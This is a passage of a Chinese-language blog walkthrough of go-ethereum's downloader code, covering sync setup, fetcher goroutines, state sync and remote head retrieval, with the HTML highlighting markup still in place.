origin &#123;</span><br><span class="line">    d.syncStatsChainOrigin = origin</span><br><span class="line">  &#125;</span><br><span class="line">  d.syncStatsChainHeight = height</span><br><span class="line">  d.syncStatsLock.Unlock()</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Ensure our origin point is below any fast sync pivot point</span></span><br><span class="line">  <span class="keyword">if</span> mode == FastSync &#123;</span><br><span class="line">    <span class="keyword">if</span> height &lt;= <span class="type">uint64</span>(fsMinFullBlocks) &#123;      <span class="comment">// 如果对端节点的height小于64，则共同祖先更新为0</span></span><br><span class="line">      origin = <span class="number">0</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;                   <span class="comment">// 否则更新pivot为对端节点height-64</span></span><br><span class="line">      pivotNumber := pivot.Number.Uint64()</span><br><span class="line">      <span class="keyword">if</span> pivotNumber &lt;= origin &#123;             <span class="comment">// 如果pivot小于共同祖先，则更新共同祖先为pivot的前一个</span></span><br><span class="line">        origin = pivotNumber - <span class="number">1</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// Write out the pivot into the database so a rollback beyond it will</span></span><br><span class="line">      <span class="comment">// reenable fast sync</span></span><br><span class="line">      rawdb.WriteLastPivotNumber(d.stateDB, pivotNumber)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  d.committed = <span class="number">1</span></span><br><span class="line">  <span class="keyword">if</span> mode == FastSync &amp;&amp; pivot.Number.Uint64() != <span class="number">0</span> &#123;</span><br><span class="line">    d.committed = <span class="number">0</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> mode == FastSync &#123;</span><br><span class="line">    <span class="comment">// Set the ancient data limitation.</span></span><br><span class="line">    <span class="comment">// If we are running fast sync, all block data older than ancientLimit will be</span></span><br><span class="line">    <span class="comment">// written to the ancient store. More recent data will be written to the active</span></span><br><span class="line">    <span class="comment">// database and will wait for the freezer to migrate.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// If there is a checkpoint available, then calculate the ancientLimit through</span></span><br><span class="line">    <span class="comment">// that. Otherwise calculate the ancient limit through the advertised height</span></span><br><span class="line">    <span class="comment">// of the remote peer.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// The reason for picking checkpoint first is that a malicious peer can give us</span></span><br><span class="line">    <span class="comment">// a fake (very high) height, forcing the ancient limit to also be very high.</span></span><br><span class="line">    <span class="comment">// The peer would start to feed us valid blocks until head, resulting in all of</span></span><br><span class="line">    <span class="comment">// the blocks might be written into the ancient store. A following mini-reorg</span></span><br><span class="line">    <span class="comment">// could cause issues.</span></span><br><span class="line">    <span class="keyword">if</span> d.checkpoint != <span class="number">0</span> &amp;&amp; d.checkpoint &gt; fullMaxForkAncestry+<span class="number">1</span> &#123;</span><br><span class="line">      d.ancientLimit = d.checkpoint</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> height &gt; fullMaxForkAncestry+<span class="number">1</span> &#123;</span><br><span class="line">      d.ancientLimit = height - fullMaxForkAncestry - <span class="number">1</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      d.ancientLimit = <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    frozen, _ := d.stateDB.Ancients() <span class="comment">// Ignore the error here since light client can also hit here.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// If a part of blockchain data has already been written into active store,</span></span><br><span class="line">    <span class="comment">// disable the ancient style insertion explicitly.</span></span><br><span class="line">    <span class="keyword">if</span> origin &gt;= frozen &amp;&amp; frozen != <span class="number">0</span> &#123;</span><br><span class="line">      d.ancientLimit = <span class="number">0</span></span><br><span class="line">      log.Info(<span class="string">&quot;Disabling direct-ancient mode&quot;</span>, <span class="string">&quot;origin&quot;</span>, origin, <span class="string">&quot;ancient&quot;</span>, frozen<span class="number">-1</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> d.ancientLimit &gt; <span class="number">0</span> &#123;</span><br><span class="line">      log.Debug(<span class="string">&quot;Enabling direct-ancient mode&quot;</span>, <span class="string">&quot;ancient&quot;</span>, d.ancientLimit)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Rewind the ancient store and blockchain if reorg happens.</span></span><br><span class="line">    <span class="keyword">if</span> origin+<span class="number">1</span> &lt; frozen &#123;</span><br><span class="line">      <span class="keyword">if</span> err := d.lightchain.SetHead(origin + <span class="number">1</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Initiate the sync using a concurrent header and content retrieval algorithm</span></span><br><span class="line">  d.queue.Prepare(origin+<span class="number">1</span>, mode) <span class="comment">// 更新queue的值从共同祖先+1开始，即从共同祖先开始sync区块</span></span><br><span class="line">  <span class="keyword">if</span> d.syncInitHook != <span class="literal">nil</span> &#123;</span><br><span class="line">    d.syncInitHook(origin, height)</span><br><span class="line">  &#125;</span><br><span class="line">  fetchers := []<span class="function"><span class="keyword">func</span><span class="params">()</span></span> <span class="type">error</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">func</span><span class="params">()</span></span> <span class="type">error</span> &#123; <span class="keyword">return</span> d.fetchHeaders(p, origin+<span class="number">1</span>) &#125;, <span class="comment">// Headers are always retrieved</span></span><br><span class="line">    <span class="function"><span class="keyword">func</span><span class="params">()</span></span> <span class="type">error</span> &#123; <span class="keyword">return</span> d.fetchBodies(origin + <span class="number">1</span>) &#125;,   <span class="comment">// Bodies are retrieved during normal and fast sync</span></span><br><span class="line">    <span class="function"><span class="keyword">func</span><span class="params">()</span></span> <span class="type">error</span> &#123; <span class="keyword">return</span> d.fetchReceipts(origin + <span class="number">1</span>) &#125;, <span class="comment">// Receipts are retrieved during fast sync</span></span><br><span class="line">    <span class="function"><span class="keyword">func</span><span class="params">()</span></span> <span class="type">error</span> &#123; <span class="keyword">return</span> d.processHeaders(origin+<span class="number">1</span>, td) &#125;,</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> mode == FastSync &#123;        <span class="comment">//根据模式的不同，增加新的处理逻辑</span></span><br><span class="line">    d.pivotLock.Lock()</span><br><span class="line">    d.pivotHeader = pivot</span><br><span class="line">    d.pivotLock.Unlock()</span><br><span class="line"></span><br><span class="line">    fetchers = <span class="built_in">append</span>(fetchers, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> <span class="type">error</span> &#123; <span class="keyword">return</span> d.processFastSyncContent() &#125;)</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> mode == FullSync &#123;</span><br><span class="line">    fetchers = <span class="built_in">append</span>(fetchers, d.processFullSyncContent)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> d.spawnSync(fetchers)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>spawnSync 会给每个 fetcher 启动一个 goroutine, 然后阻塞的检查 fetcher 是否出错：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// spawnSync runs d.process and all given fetcher functions to completion in</span></span><br><span class="line"><span class="comment">// separate goroutines, returning the first error that appears.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *Downloader)</span></span> spawnSync(fetchers []<span class="function"><span class="keyword">func</span><span class="params">()</span></span> <span class="type">error</span>) <span class="type">error</span> &#123;</span><br><span class="line">  errc := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">error</span>, <span class="built_in">len</span>(fetchers))</span><br><span class="line">  d.cancelWg.Add(<span class="built_in">len</span>(fetchers))</span><br><span class="line">  <span class="keyword">for</span> _, fn := <span class="keyword">range</span> fetchers &#123;</span><br><span class="line">    fn := fn</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123; <span class="keyword">defer</span> d.cancelWg.Done(); errc &lt;- fn() &#125;()</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Wait for the first error, then terminate the others.</span></span><br><span class="line">  <span class="keyword">var</span> err <span class="type">error</span></span><br><span class="line">  <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(fetchers); i++ &#123;</span><br><span class="line">    <span class="keyword">if</span> i == <span class="built_in">len</span>(fetchers)<span class="number">-1</span> &#123;</span><br><span class="line">      <span class="comment">// Close the queue when all fetchers have exited.</span></span><br><span class="line">      <span class="comment">// This will cause the block processor to end when</span></span><br><span class="line">      <span class="comment">// it has processed the queue.</span></span><br><span class="line">      d.queue.Close()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> err = &lt;-errc; err != <span class="literal">nil</span> &amp;&amp; err != errCanceled &#123;</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  d.queue.Close()</span><br><span class="line">  d.Cancel()</span><br><span class="line">  <span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="同步-State"><strong>同步 State</strong></h4><p>state 即世界状态，其保存着所有账户的余额等信息</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filedir: go-ethereum-1.10.2\eth\downloader\statesync.go</span></span><br><span class="line"><span class="comment">// stateFetcher manages the active state sync and accepts requests</span></span><br><span class="line"><span class="comment">// on its behalf.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *Downloader)</span></span> stateFetcher() &#123;</span><br><span class="line">  <span class="keyword">for</span> &#123;</span><br><span class="line">    <span class="keyword">select</span> &#123;</span><br><span class="line">    <span class="keyword">case</span> s := &lt;-d.stateSyncStart:</span><br><span class="line">      <span class="keyword">for</span> next := s; next != <span class="literal">nil</span>; &#123;</span><br><span class="line">        next = d.runStateSync(next)</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">case</span> &lt;-d.stateCh:</span><br><span class="line">      <span class="comment">// Ignore state responses while no sync is running.</span></span><br><span class="line">    <span class="keyword">case</span> &lt;-d.quitCh:</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>runStateSync 函数执行状态同步，直到它完成或请求切换到另一个根哈希：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// runStateSync runs a state synchronisation until it completes or another root</span></span><br><span class="line"><span class="comment">// hash is requested to be switched over to.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *Downloader)</span></span> runStateSync(s *stateSync) *stateSync &#123;</span><br><span class="line">  <span class="keyword">var</span> (</span><br><span class="line">    active   = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]*stateReq) <span class="comment">// Currently in-flight requests</span></span><br><span class="line">    finished []*stateReq                  <span class="comment">// Completed or failed requests</span></span><br><span class="line">    timeout  = <span class="built_in">make</span>(<span class="keyword">chan</span> *stateReq)       <span class="comment">// Timed out active requests</span></span><br><span class="line">  )</span><br><span class="line">  log.Trace(<span class="string">&quot;State sync starting&quot;</span>, <span class="string">&quot;root&quot;</span>, s.root)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// Cancel active request timers on exit. Also set peers to idle so they&#x27;re</span></span><br><span class="line">    <span class="comment">// available for the next sync.</span></span><br><span class="line">    <span class="keyword">for</span> _, req := <span class="keyword">range</span> active &#123;</span><br><span class="line">      req.timer.Stop()</span><br><span class="line">      req.peer.SetNodeDataIdle(<span class="type">int</span>(req.nItems), time.Now())</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;()</span><br><span class="line">  <span class="keyword">go</span> s.run()</span><br><span class="line">  <span class="keyword">defer</span> s.Cancel()</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Listen for peer departure events to cancel assigned tasks</span></span><br><span class="line">  peerDrop := <span class="built_in">make</span>(<span class="keyword">chan</span> *peerConnection, <span class="number">1024</span>)</span><br><span class="line">  peerSub := s.d.peers.SubscribePeerDrops(peerDrop)</span><br><span class="line">  <span class="keyword">defer</span> peerSub.Unsubscribe()</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> &#123;</span><br><span class="line">    <span class="comment">// Enable sending of the first buffered element if there is one.</span></span><br><span class="line">    <span class="keyword">var</span> (</span><br><span class="line">      deliverReq   *stateReq</span><br><span class="line">      deliverReqCh <span class="keyword">chan</span> *stateReq</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(finished) &gt; <span class="number">0</span> &#123;</span><br><span class="line">      deliverReq = finished[<span class="number">0</span>]</span><br><span class="line">      deliverReqCh = s.deliver</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">select</span> &#123;</span><br><span class="line">    <span class="comment">// The stateSync lifecycle:</span></span><br><span class="line">    <span class="keyword">case</span> next := &lt;-d.stateSyncStart:</span><br><span class="line">      d.spindownStateSync(active, finished, timeout, peerDrop)</span><br><span class="line">      <span class="keyword">return</span> next</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> &lt;-s.done:</span><br><span class="line">      d.spindownStateSync(active, finished, timeout, peerDrop)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Send the next finished request to the current sync:</span></span><br><span class="line">    <span class="keyword">case</span> deliverReqCh &lt;- deliverReq:</span><br><span class="line">      <span class="comment">// Shift out the first request, but also set the emptied slot to nil for GC</span></span><br><span class="line">      <span class="built_in">copy</span>(finished, finished[<span class="number">1</span>:])</span><br><span class="line">      finished[<span class="built_in">len</span>(finished)<span class="number">-1</span>] = <span class="literal">nil</span></span><br><span class="line">      finished = finished[:<span class="built_in">len</span>(finished)<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Handle incoming state packs:</span></span><br><span class="line">    <span class="keyword">case</span> pack := &lt;-d.stateCh:</span><br><span class="line">      <span class="comment">// Discard any data not requested (or previously timed out)</span></span><br><span class="line">      req := active[pack.PeerId()]</span><br><span class="line">      <span class="keyword">if</span> req == <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Debug(<span class="string">&quot;Unrequested node data&quot;</span>, <span class="string">&quot;peer&quot;</span>, pack.PeerId(), <span class="string">&quot;len&quot;</span>, pack.Items())</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// Finalize the request and queue up for processing</span></span><br><span class="line">      req.timer.Stop()</span><br><span class="line">      req.response = pack.(*statePack).states</span><br><span class="line">      req.delivered = time.Now()</span><br><span class="line"></span><br><span class="line">      finished = <span class="built_in">append</span>(finished, req)</span><br><span class="line">      <span class="built_in">delete</span>(active, pack.PeerId())</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Handle dropped peer connections:</span></span><br><span class="line">    <span class="keyword">case</span> p := &lt;-peerDrop:</span><br><span class="line">      <span class="comment">// Skip if no request is currently pending</span></span><br><span class="line">      req := active[p.id]</span><br><span class="line">      <span class="keyword">if</span> req == <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// Finalize the request and queue up for processing</span></span><br><span class="line">      req.timer.Stop()</span><br><span class="line">      req.dropped = <span class="literal">true</span></span><br><span class="line">      req.delivered = time.Now()</span><br><span class="line"></span><br><span class="line">      finished = <span class="built_in">append</span>(finished, req)</span><br><span class="line">      <span class="built_in">delete</span>(active, p.id)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Handle timed-out requests:</span></span><br><span class="line">    <span class="keyword">case</span> req := &lt;-timeout:</span><br><span class="line">      <span class="comment">// If the peer is already requesting something else, ignore the stale timeout.</span></span><br><span class="line">      <span class="comment">// This can happen when the timeout and the delivery happens simultaneously,</span></span><br><span class="line">      <span class="comment">// causing both pathways to trigger.</span></span><br><span class="line">      <span class="keyword">if</span> active[req.peer.id] != req &#123;</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">      &#125;</span><br><span class="line">      req.delivered = time.Now()</span><br><span class="line">      <span class="comment">// Move the timed out data back into the download queue</span></span><br><span class="line">      finished = <span class="built_in">append</span>(finished, req)</span><br><span class="line">      <span class="built_in">delete</span>(active, req.peer.id)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Track outgoing state requests:</span></span><br><span class="line">    <span class="keyword">case</span> req := &lt;-d.trackStateReq:</span><br><span class="line">      <span class="comment">// If an active request already exists for this peer, we have a problem. In</span></span><br><span class="line">      <span class="comment">// theory the trie node schedule must never assign two requests to the same</span></span><br><span class="line">      <span class="comment">// peer. In practice however, a peer might receive a request, disconnect and</span></span><br><span class="line">      <span class="comment">// immediately reconnect before the previous times out. In this case the first</span></span><br><span class="line">      <span class="comment">// request is never honored, alas we must not silently overwrite it, as that</span></span><br><span class="line">      <span class="comment">// causes valid requests to go missing and sync to get stuck.</span></span><br><span class="line">      <span class="keyword">if</span> old := active[req.peer.id]; old != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Warn(<span class="string">&quot;Busy peer assigned new state fetch&quot;</span>, <span class="string">&quot;peer&quot;</span>, old.peer.id)</span><br><span class="line">        <span class="comment">// Move the previous request to the finished set</span></span><br><span class="line">        old.timer.Stop()</span><br><span class="line">        old.dropped = <span class="literal">true</span></span><br><span class="line">        old.delivered = time.Now()</span><br><span class="line">        finished = <span class="built_in">append</span>(finished, old)</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// Start a timer to notify the sync loop if the peer stalled.</span></span><br><span class="line">      req.timer = time.AfterFunc(req.timeout, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        timeout &lt;- req</span><br><span class="line">      &#125;)</span><br><span class="line">      active[req.peer.id] = req</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="同步-Head"><strong>同步 Head</strong></h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fetchHead retrieves the head header and prior pivot block (if available) from a remote peer.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *Downloader)</span></span> fetchHead(p *peerConnection) (head *types.Header, pivot *types.Header, err <span class="type">error</span>) &#123;</span><br><span class="line">  p.log.Debug(<span class="string">&quot;Retrieving remote chain head&quot;</span>)</span><br><span class="line">  <span class="comment">//获取mode值</span></span><br><span class="line">  mode := d.getMode()</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Request the advertised remote head block and wait for the response</span></span><br><span class="line">  latest, _ := p.peer.Head()</span><br><span class="line">  fetch := <span class="number">1</span></span><br><span class="line">  <span class="keyword">if</span> mode == FastSync &#123;</span><br><span class="line">    fetch = <span class="number">2</span> <span class="comment">// head + pivot headers</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">go</span> p.peer.RequestHeadersByHash(latest, fetch, fsMinFullBlocks<span class="number">-1</span>, <span class="literal">true</span>)</span><br><span class="line"></span><br><span class="line">  ttl := d.requestTTL()</span><br><span class="line">  timeout := time.After(ttl)</span><br><span class="line">  <span class="keyword">for</span> &#123;</span><br><span class="line">    <span class="keyword">select</span> &#123;</span><br><span class="line">    <span class="keyword">case</span> &lt;-d.cancelCh:</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span>, errCanceled</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> packet := &lt;-d.headerCh:</span><br><span class="line">      <span class="comment">// Discard anything not from the origin peer</span></span><br><span class="line">      <span class="keyword">if</span> packet.PeerId() != p.id &#123;</span><br><span class="line">        log.Debug(<span class="string">&quot;Received headers from incorrect peer&quot;</span>, <span class="string">&quot;peer&quot;</span>, packet.PeerId())</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// Make sure the peer gave us at least one and at most the requested headers</span></span><br><span class="line">      headers := packet.(*headerPack).headers</span><br><span class="line">      <span class="keyword">if</span> <span class="built_in">len</span>(headers) == <span class="number">0</span> || <span class="built_in">len</span>(headers) &gt; fetch &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;%w: returned headers %d != requested %d&quot;</span>, errBadPeer, <span class="built_in">len</span>(headers), fetch)</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// The first header needs to be the head, validate against the checkpoint</span></span><br><span class="line">      <span class="comment">// and request. If only 1 header was returned, make sure there&#x27;s no pivot</span></span><br><span class="line">      <span class="comment">// or there was not one requested.</span></span><br><span class="line">      head := headers[<span class="number">0</span>]</span><br><span class="line">      <span class="keyword">if</span> (mode == FastSync || mode == LightSync) &amp;&amp; head.Number.Uint64() &lt; d.checkpoint &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;%w: remote head %d below checkpoint %d&quot;</span>, errUnsyncedPeer, head.Number, d.checkpoint)</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> <span class="built_in">len</span>(headers) == <span class="number">1</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> mode == FastSync &amp;&amp; head.Number.Uint64() &gt; <span class="type">uint64</span>(fsMinFullBlocks) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;%w: no pivot included along head header&quot;</span>, errBadPeer)</span><br><span class="line">        &#125;</span><br><span class="line">        p.log.Debug(<span class="string">&quot;Remote head identified, no pivot&quot;</span>, <span class="string">&quot;number&quot;</span>, head.Number, <span class="string">&quot;hash&quot;</span>, head.Hash())</span><br><span class="line">        <span class="keyword">return</span> head, <span class="literal">nil</span>, <span class="literal">nil</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// At this point we have 2 headers in total and the first is the</span></span><br><span class="line">      <span class="comment">// validated head of the chian. Check the pivot number and return,</span></span><br><span class="line">      pivot := headers[<span class="number">1</span>]</span><br><span class="line">      <span class="keyword">if</span> pivot.Number.Uint64() != head.Number.Uint64()-<span class="type">uint64</span>(fsMinFullBlocks) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;%w: remote pivot %d != requested %d&quot;</span>, errInvalidChain, pivot.Number, head.Number.Uint64()-<span class="type">uint64</span>(fsMinFullBlocks))</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> head, pivot, <span class="literal">nil</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> &lt;-timeout:</span><br><span class="line">      p.log.Debug(<span class="string">&quot;Waiting for head header timed out&quot;</span>, <span class="string">&quot;elapsed&quot;</span>, ttl)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span>, errTimeout</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> &lt;-d.bodyCh:</span><br><span class="line">    <span class="keyword">case</span> &lt;-d.receiptCh:</span><br><span class="line">      <span class="comment">// Out of bounds delivery, ignore</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="处理-Head"><strong>处理 Head</strong></h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 